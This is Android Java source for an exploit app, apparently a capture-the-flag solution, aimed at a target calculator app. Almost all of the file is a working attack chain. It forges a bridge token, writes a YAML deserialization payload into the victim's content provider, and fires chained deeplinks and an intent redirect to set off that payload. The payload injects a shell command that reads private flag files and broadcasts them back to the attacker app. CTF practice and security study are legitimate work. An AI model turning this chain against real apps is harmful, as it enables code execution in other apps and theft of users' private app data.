package com.qinquang.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.FileOutputStream;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitActivity";
    private static final String TARGET_PKG = "com.qinquang.calc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.exploit_button);
        exploitButton.setOnClickListener(v -> {
            try {
                triggerExploit();
                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Log.e(TAG, "Exploit failed", e);
                Toast.makeText(this, "Exploit failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    private void triggerExploit() throws Exception {
        // === 1. Compute bridge token ===
        String token = generateToken(TARGET_PKG);
        Log.d(TAG, "Generated Token: " + token);

        // === 2. Build YAML payload ===
        String command = "for f in /data/data/com.qinquang.calc/flag-*.txt; do " +
                "[ -f \"$f\" ] && am broadcast -a com.qinquang.calc.FLAG --es flag \"$(cat \"$f\")\"; done";
        String yamlPayload = "!!com.qinquang.calc.PingUtil [\"" + command + "\"]";
        Log.d(TAG, "YAML Payload: " + yamlPayload);

        // === 3. Actually write YAML to victim provider ===
        Uri writeUri = Uri.parse("content://com.qinquang.calc/history.yml");
        ContentResolver resolver = getContentResolver();

        try (ParcelFileDescriptor pfd = resolver.openFileDescriptor(writeUri, "w")) {
            if (pfd == null) {
                Log.e(TAG, "openFileDescriptor returned null");
                return;
            }
            FileOutputStream fos = new FileOutputStream(pfd.getFileDescriptor());
            fos.write(yamlPayload.getBytes(StandardCharsets.UTF_8));
            fos.flush();
            fos.close();
            Log.d(TAG, "Successfully wrote YAML payload to " + writeUri);
        } catch (Exception e) {
            Log.e(TAG, "Failed to write YAML payload", e);
            throw e;
        }

        // === 4. Build the orig Intent that BridgeActivity will trigger ===
        Intent orig = new Intent();
        orig.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.HistoryActivity"));
        orig.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        orig.putExtra("bridge_token", token);
        orig.putExtra("bridge_yaml", yamlPayload);

        String origUri = orig.toUri(Intent.URI_INTENT_SCHEME);
        Log.d(TAG, "Orig Intent URI: " + origUri);

        String encodedOrigUri = URLEncoder.encode(origUri, "UTF-8");
        Uri firstDeeplink = Uri.parse("qiangcalc://calculate?expression=" + encodedOrigUri);

        // === 5. Send first deeplink (store fallback) ===
        Intent first = new Intent(Intent.ACTION_VIEW, firstDeeplink);
        first.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.MainActivity"));
        first.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        Log.d(TAG, "Sending first deeplink to store fallback");
        startActivity(first);

        Thread.sleep(300);

        // === 6. Trigger exception (1/0) to cause BridgeActivity ===
        Uri secondDeeplink = Uri.parse("qiangcalc://calculate?expression=1%2F0");
        Intent second = new Intent(Intent.ACTION_VIEW, secondDeeplink);
        second.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.MainActivity"));
        second.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        Log.d(TAG, "Sending second deeplink to trigger onEqual() exception and Bridge flow");
        startActivity(second);

        Log.d(TAG, "Exploit complete â€” check victim log for deserialization.");
    }

    private String generateToken(String packageName) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(packageName.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            sb.append(String.format("%02x", hash[i]));
        }
        return sb.toString();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if (intent != null && intent.hasExtra("flag")) {
            TextView flagTextView = findViewById(R.id.flag_textview);
            String flag = intent.getStringExtra("flag");
            flagTextView.setText("FLAG: " + flag);
        }
    }
}
